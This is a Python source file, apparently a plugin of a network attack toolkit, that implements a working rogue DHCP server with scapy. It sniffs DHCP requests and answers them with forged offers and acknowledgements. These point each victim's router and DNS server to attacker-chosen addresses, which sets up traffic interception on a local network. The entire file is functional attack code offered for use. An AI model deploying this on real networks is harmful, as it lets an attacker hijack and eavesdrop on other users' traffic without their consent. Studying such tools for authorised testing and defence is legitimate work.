# -*- coding: utf-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

from scapy.all import sendp,sniff
from scapy.layers.l2 import getmacbyip,Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from netaddr import IPNetwork, IPAddress
from .arp_poison import evaluate_address  # import function from plugin arp_poison to evaluate if ip params are valid ip

range_ip = []
ipServer = ""
interface = ""
gateway = ""
mask = ""
network = ""
domain = ""
domain_server = ""


def run(ip_Server, iface, gate, net, netmask, localdomain, domain_ip):
    """
    This function start to sniff DHCP packets.

    :param ip_Server: DHCP server ip address
    :type ip_Server: str
    :param iface: interface to be launched the attack
    :type iface: str
    :param gate: gateway ip address
    :type gate: str
    :param net: network of the ip pool
    :type net: str
    :param netmask: netmask of the ip pool
    type: netmask: str
    :param localdomain: name of the domain
    :type localdomain: str
    :param domain_ip: ip address of domain server
    :type domain_ip: str
    """

    global range_ip
    global ipServer
    global interface
    global gateway
    global mask
    global network
    global domain
    global domain_server

    evaluate_address(ip_Server)
    evaluate_address(net)

    if gateway != "":
        evaluate_address(gate)

    try:
        IPAddress(netmask)
    except ValueError:
        raise TypeError("'%s' is not a valid mask" % netmask)

    ipServer = ip_Server
    interface = iface
    gateway = gate
    mask = netmask
    network = net
    domain = localdomain
    domain_server = domain_ip

    range_ip = list(IPNetwork(network+"/"+mask))  # create an ip list
    if IPAddress(ipServer) in range_ip:  # if ipServer is in ip list remove it
        range_ip.remove(IPAddress(ipServer))
    range_ip.pop()  # remove the broadcast ip
    range_ip.remove(IPAddress(network))  # remove the network address

    if IPAddress(gateway) in range_ip:  # if gateway ip is in ip list remove it
        range_ip.remove(IPAddress(gateway))

    if domain == "":
        domain = "localdomain"

    if domain_server == "":
        domain_server = ipServer
    else:
        evaluate_address(domain_server)

    sniff(prn=is_DHCP, filter="udp and (port 67 or 68)", iface=interface)


def run_attack(config):
    """
    This function is used for launch the DHCP ROGUE attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`
    """

    run(config.ipserver, config.interface[0], config.gateway, config.network, config.netmask, config.domain, config.server_domain)


def is_DHCP(pkt):
    """
    This fuction check if DHCP is present in the packet.
    If packet is DHCP DISCOVER o DHCP REQUEST, sent the host configuration.
    :param pkt: This param is a UDP packet.
    :return:
    """
    global range_ip
    global ipServer
    global interface
    global gateway
    global mask
    global network
    global domain
    global domain_server

    if gateway is None:
        gateway = ipServer

    if DHCP in pkt:

        if pkt[DHCP].options[0][1] == 1:

            ipClient = str(range_ip[-1])

            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src=ipServer, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)

            bootp= BOOTP(op=2, yiaddr=ipClient, siaddr=ipServer, chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)

            dhcp = DHCP(options=[('message-type', 'offer'), ('subnet_mask', mask), ('server_id', ipServer),
                                 ('lease_time', 1800), ('domain', domain), ('router', gateway),
                                 ('name_server', ipServer), 'end'])

            dhcp_offer = ether/ip/udp/bootp/dhcp

            sendp(dhcp_offer, iface=interface, verbose=0)

        if pkt[DHCP].options[0][1] == 3:

            ipClient = str(range_ip.pop())
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src=ipServer, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)

            bootp= BOOTP(op=2, yiaddr=ipClient, siaddr=ipServer, chaddr = pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
            dhcp = DHCP(options=[('message-type', 'ack'), ('subnet_mask', mask), ('server_id', ipServer),
                                 ('lease_time', 1800), ('domain', domain), ('router', gateway),
                                 ('name_server', domain_server), 'end'])

            ack = ether/ip/udp/bootp/dhcp

            sendp(ack, iface=interface, verbose=0)

